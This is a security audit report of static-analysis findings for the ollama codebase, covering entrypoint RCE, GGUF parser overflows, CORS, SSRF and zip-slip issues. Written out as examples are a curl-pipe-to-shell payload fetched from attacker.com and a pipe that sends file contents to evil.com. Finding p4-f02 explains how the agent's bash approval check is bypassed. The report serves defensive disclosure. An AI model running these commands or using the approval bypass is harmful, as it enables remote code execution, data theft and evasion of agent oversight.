# Merged SAST Summary

## Included Sources

- `.archon-merge-staging-1765496804/sast-results.md`
- `ollama-with-opus-4.7` has no matching source file

## Source 1 - sast-results.md

# Static Analysis Results — ollama/ollama

**Date**: 2026-04-07
**Analyst**: Static Analyzer (Phase 4)
**Method**: Manual grep-based static analysis (CodeQL and Semgrep not available in environment)
**Scope**: Full codebase, focused on Phase 4 DFD/CFD high-risk slices

---

## Tooling Notes

Both `codeql` and `semgrep` binaries are absent from the analysis environment. All findings below are the result of systematic grep-based manual static analysis targeting the exact source/sink/flow patterns documented in the KB Phase 4 CodeQL Extraction Targets. Custom Semgrep rules and CodeQL queries have been written to `archon/semgrep-rules/` and `archon/codeql-queries/` for execution in a tooled environment.

---

## Finding Summary

| ID | Severity | Title | DFD Slice | CWE | File |
|----|----------|-------|-----------|-----|------|
| p4-f01 | CRITICAL | Supply-Chain RCE via ENTRYPOINT | DFD-1 | CWE-78, CWE-494 | `cmd/cmd.go`, `types/model/config.go` |
| p4-f02 | HIGH | Agent bash -c: Pipe/find/sed Bypass | DFD-3 | CWE-78 | `x/tools/bash.go`, `x/agent/approval.go` |
| p4-f03 | HIGH | GGUF Unbounded String Allocation (OOM) | DFD-4 | CWE-770, CWE-400 | `fs/ggml/gguf.go:348-371` |
| p4-f04 | HIGH | GGUF Array Count uint64->int Overflow | DFD-4 | CWE-190 | `fs/ggml/gguf.go:437` |
| p4-f05 | HIGH | GGUF Tensor.Elements() Multiplication Overflow | DFD-4 | CWE-190 | `fs/ggml/ggml.go:505-515` |
| p4-f06 | HIGH | GGUF ggufPadding Div-by-Zero (alignment=0) | DFD-4 | CWE-369 | `fs/ggml/gguf.go:687` |
| p4-f07 | HIGH | CORS file://* Allows Full API Access | DFD-2, CFD-1 | CWE-942, CWE-306 | `envconfig/config.go:97` |
| p4-f08 | HIGH | registry.Local Bypasses allowedHostsMiddleware | CFD-1 | CWE-284 | `server/internal/registry/server.go:118-121` |
| p4-f09 | HIGH | ZIP Slip in Auto-Updater (Pre-Signature) | TB9 | CWE-22 | `app/updater/updater_darwin.go:170,301` |
| p4-f10 | MEDIUM | Blob Cache: 0o777 Perms + Size-Only Integrity | CFD-3 | CWE-345, CWE-732 | `server/internal/cache/blob/cache.go:79,458` |
| p4-f11 | MEDIUM | SSRF via /api/pull Model Registry Host | DFD-1 | CWE-918 | `types/model/name.go:317` |

---

## Detailed Findings

### p4-f01 — CRITICAL: Supply-Chain RCE via ENTRYPOINT

**Severity**: CRITICAL
**Files**: `cmd/cmd.go` (runEntrypoint), `types/model/config.go:51`
**DFD**: DFD-1 (Registry -> Config JSON -> Command Execution)

The `ENTRYPOINT` directive is stored in `ConfigV2.Entrypoint`, a JSON-serialized field in the model's OCI config blob. When `ollama run <model>` executes, `runEntrypoint()` calls `exec.Command(execPath, args...)` with inherited stdio and zero sandboxing. There is no user consent prompt, no capability check, and no distinction between locally-created and registry-pulled models. The experimental-features flag is retrieved but never checked before entrypoint execution.

**Attack**: Push model with `ENTRYPOINT curl attacker.com/payload|sh` → victim runs `ollama run model` → full RCE. `$PROMPT` substitution injects user input into command string before whitespace splitting (argument injection secondary vector).

**Draft**: `/private/tmp/ollama/archon/findings-draft/p4-f01-entrypoint-rce.md`

---

### p4-f02 — HIGH: Agent Tool Execution — Pipe Target and safeCommands Bypass

**Severity**: HIGH
**Files**: `x/tools/bash.go:64`, `x/agent/approval.go:204-299`
**DFD**: DFD-3

`extractBashPrefix` examines only the first pipe segment. `cat tools/safe.go | curl evil.com` gets prefix `cat:tools/` and is auto-approved; the `curl` exfiltration is never evaluated. `find` and `sed` are in `safeCommands`, but `find -exec` runs arbitrary subcommands, and `sed -i` modifies files in-place. Once a `find:tools/` or `sed:tools/` prefix is approved, arbitrary destructive variants are auto-approved. Shell metacharacter injection (backtick, `$()`, brace expansion) is not blocked. `curl` GET (without `-d`/`-X POST`) is not in `denyPatterns`.

**Draft**: `/private/tmp/ollama/archon/findings-draft/p4-f02-agent-bash-injection.md`

---

### p4-f03 — HIGH: GGUF Unbounded String Allocation

**Severity**: HIGH
**Files**: `fs/ggml/gguf.go:348-371` (readGGUFString), `:296-310` (readGGUFV1String)
**DFD**: DFD-4

`readGGUFString`: length read as uint64, cast to int (overflow risk), then `make([]byte, length)` when `length > 16KB` scratch. No upper bound on the allocation. A crafted GGUF with a multi-gigabyte string length field causes OOM. `readGGUFV1String` uses `io.CopyN(&b, r, int64(length))` with an unbounded `bytes.Buffer`. Multiple callers pass `maxArraySize = -1` (uncapped), including the `/api/create` blob path, `/api/blobs` path, and model load. Array element count capping (`maxArraySize`) does not protect string fields.

**Draft**: `/private/tmp/ollama/archon/findings-draft/p4-f03-gguf-unbounded-string-alloc.md`

---

### p4-f04 — HIGH: GGUF Array Count uint64->int Overflow

**Severity**: HIGH
**Files**: `fs/ggml/gguf.go:430-437`
**DFD**: DFD-4

`readGGUFArray` reads array count `n` as `uint64` then casts to `int(n)` for `newArray`. On 64-bit systems, `n > math.MaxInt` wraps to negative. `newArray` then evaluates `size <= maxSize` with a negative `size`: when `maxSize < 0`, the condition `maxSize < 0` is true and `make([]T, size)` is called with a negative size, causing a runtime panic. When `maxSize >= 0`, `negative <= positive` is also true, same result.

**Draft**: `/private/tmp/ollama/archon/findings-draft/p4-f04-gguf-integer-overflow-array.md`

---

### p4-f05 — HIGH: GGUF Tensor.Elements() Multiplication Overflow

**Severity**: HIGH
**Files**: `fs/ggml/ggml.go:505-515`
**DFD**: DFD-4

`Tensor.Elements()` multiplies shape values (read from GGUF, type `uint64`) without overflow detection. `Shape = [2^32, 2^32]` wraps `count` to 0, making `Size() = 0`. The bounds check at `gguf.go:259-262` (`tensorEnd > uint64(fileSize)`) passes when `Size()=0`, allowing an out-of-bounds tensor offset to go undetected. Also, `typeSize()` returns 0 for unknown tensor kinds (no `default` in the switch), making `Size()=0` for any crafted `Kind` value, bypassing bounds validation.

**Draft**: `/private/tmp/ollama/archon/findings-draft/p4-f05-gguf-tensor-elements-overflow.md`

---

### p4-f06 — HIGH: GGUF ggufPadding Divide-by-Zero

**Severity**: HIGH
**Files**: `fs/ggml/gguf.go:687-689`, `:238`
**DFD**: DFD-4

```go
func ggufPadding(offset, align int64) int64 {
    return (align - offset%align) % align
}
```
`alignment` is read from `llm.kv.Uint("general.alignment", 32)`. `KV.Uint()` returns the found value even when it is 0 — the default (32) is only used when the key is absent. A GGUF that explicitly sets `general.alignment = 0` triggers `offset % 0` → integer divide by zero panic. Called at `gguf.go:245,269` and `ggml.go:573,580`.

**Draft**: `/private/tmp/ollama/archon/findings-draft/p4-f06-gguf-div-by-zero-alignment.md`

---

### p4-f07 — HIGH: CORS file://* Allows Unauthenticated Full API Access

**Severity**: HIGH
**Files**: `envconfig/config.go:97`, `server/routes.go:1664,1668-1671`
**DFD**: DFD-2, CFD-1

`"file://*"` is hardcoded in `AllowedOrigins()` and cannot be removed via `OLLAMA_ORIGINS` (additive only). All API routes — including `DELETE /api/delete`, `POST /api/pull`, `POST /api/create`, `POST /api/push` — share a single CORS policy. A malicious HTML file opened locally passes both CORS (`file://*` allowed) and `allowedHostsMiddleware` (Host is `localhost:11434`). No authentication on any endpoint. A compromised or malicious local file can delete models, pull attacker models (chaining to p4-f01 for RCE), and exfiltrate inference.

**Draft**: `/private/tmp/ollama/archon/findings-draft/p4-f07-cors-file-origin.md`

---

### p4-f08 — HIGH: registry.Local Intercepts /api/delete and /api/pull Before Middleware

**Severity**: HIGH
**Files**: `server/internal/registry/server.go:114-128`, `server/routes.go:1727-1736`
**DFD**: CFD-1

`registry.Local.serveHTTP` handles `/api/delete` and `/api/pull` directly, before gin's middleware chain (including `allowedHostsMiddleware`) runs. DNS rebinding attacks can reach these endpoints without Host header validation. `/api/pull` via DNS rebinding enables pulling attacker-controlled models, chaining into ENTRYPOINT RCE (p4-f01).

**Draft**: `/private/tmp/ollama/archon/findings-draft/p4-f08-registry-local-middleware-bypass.md`

---

### p4-f09 — HIGH: ZIP Slip in Auto-Updater Before Signature Verification

**Severity**: HIGH
**Files**: `app/updater/updater_darwin.go:170,189,285,301`
**DFD**: TB9

Two extraction loops in `updater_darwin.go` use `filepath.Join(dir, f.Name)` without a `strings.HasPrefix` traversal check. The second loop (line ~282) performs extraction BEFORE `verifyExtractedBundle` at line 340, meaning traversal-based writes persist even if signature verification fails afterward. Symlink handling blocks absolute targets and explicit `..`-prefix links but misses multi-hop symlink escapes. Requires update server compromise or MITM.

**Draft**: `/private/tmp/ollama/archon/findings-draft/p4-f09-zip-slip-updater.md`

---

### p4-f10 — MEDIUM: Blob Cache 0o777 Permissions + Size-Only Integrity Verification

**Severity**: MEDIUM
**Files**: `server/internal/cache/blob/cache.go:79,458-465`
**DFD**: CFD-3

Blob directories created with `0o777` on shared systems allow any local user to write blob files. `copyNamedFile` skips hash verification when the existing file size matches, accepting same-size poisoned blobs. `downloadBlob` returns `cacheHit=true` on `os.Stat` success, skipping `verifyBlob`. No `os.Lstat` symlink checks in blob path operations, enabling symlink-based content substitution.

**Draft**: `/private/tmp/ollama/archon/findings-draft/p4-f10-blob-integrity-skip.md`

---

### p4-f11 — MEDIUM: SSRF via /api/pull Model Name Registry Host

**Severity**: MEDIUM
**Files**: `types/model/name.go:317-321,333-336`, `server/images.go:717`
**DFD**: DFD-1

Model name `Host` field validated only by length (1–350 chars). `Name.BaseURL()` constructs `url.URL{Scheme: n.ProtocolScheme, Host: n.Host}` used for all registry operations. Attacker can specify `169.254.169.254/latest/meta-data:tag` or internal service hosts. No allowlist or block for private IP ranges. `registryOptions.Insecure` from request body forces HTTP.

**Draft**: `/private/tmp/ollama/archon/findings-draft/p4-f11-ssrf-pull-model-url.md`

---

## DFD/CFD Slice Coverage

| Slice | Findings | Coverage |
|-------|----------|----------|
| DFD-1 (Registry -> GGUF -> Exec) | p4-f01, p4-f11 | ENTRYPOINT RCE + SSRF confirmed |
| DFD-2 (Cross-Origin Browser) | p4-f07 | CORS file://* confirmed |
| DFD-3 (Agent -> bash -c) | p4-f02 | Pipe bypass, find -exec, sed -i confirmed |
| DFD-4 (Blob Upload -> GGUF Parse) | p4-f03, p4-f04, p4-f05, p4-f06 | 4 GGUF parser vulnerabilities confirmed |
| CFD-1 (Access Control) | p4-f07, p4-f08 | CORS + middleware bypass confirmed |
| CFD-2 (Agent Approval) | p4-f02 | Pipe/safeCommands bypasses confirmed |
| CFD-3 (Blob Integrity) | p4-f10 | 0o777 + size-only check confirmed |
| CFD-4 (Registry Auth) | — | getAuthorizationToken host check assessed sound (KB bypass analysis) |

## Digest Param Coverage

`manifest.BlobsPath(c.Param("digest"))` at `server/routes.go:1486,1520` uses the regex `^sha256[:-][0-9a-fA-F]{64}$` — assessed SOUND. No new bypass found beyond KB-documented `x/imagegen/transfer` write-then-verify pattern (LOW severity, already documented in KB).

---

## Custom Artifacts

**Semgrep rules** (`archon/semgrep-rules/`):
- `ollama-gguf-unsafe-alloc.yaml` — uint64->int overflow, unbounded allocation, div-by-zero, Elements() overflow
- `ollama-command-injection.yaml` — bash -c direct exec, ENTRYPOINT flow, find in safeCommands, pipe target gap
- `ollama-path-traversal.yaml` — ZIP extraction no HasPrefix, 0o777 directory, size-only integrity
- `ollama-ssrf-cors.yaml` — file://* CORS, BaseURL SSRF, registry.Local middleware bypass

**CodeQL queries** (`archon/codeql-queries/`):
- `gguf-unsafe-array-alloc.ql` — uint64->int truncation in readGGUFArray
- `gguf-string-unbounded-alloc.ql` — string length taint flow to make()
- `entrypoint-rce-flow.ql` — ConfigV2.Entrypoint taint to exec.Command

---

## Notes on Analysis Gaps

1. **OpenAI/Anthropic middleware** (`middleware/openai.go`, `middleware/anthropic.go`): Translation layers convert request fields between formats. A focused review of field mapping where model name, system prompt, or tool arguments are re-serialized could surface injection via format conversion. Not fully audited in this pass.

2. **x/imagegen/transfer** write-then-verify pattern: Already documented in KB as LOW severity. No new vectors found.

3. **CGo boundary** (llama.cpp): The C++ inference engine processes model tensors after Go-level parsing. The Go GGUF parser performs some bounds checks, but malicious tensor data that passes Go validation could still trigger C++ memory safety issues. Not reachable via static analysis without C/C++ tooling.

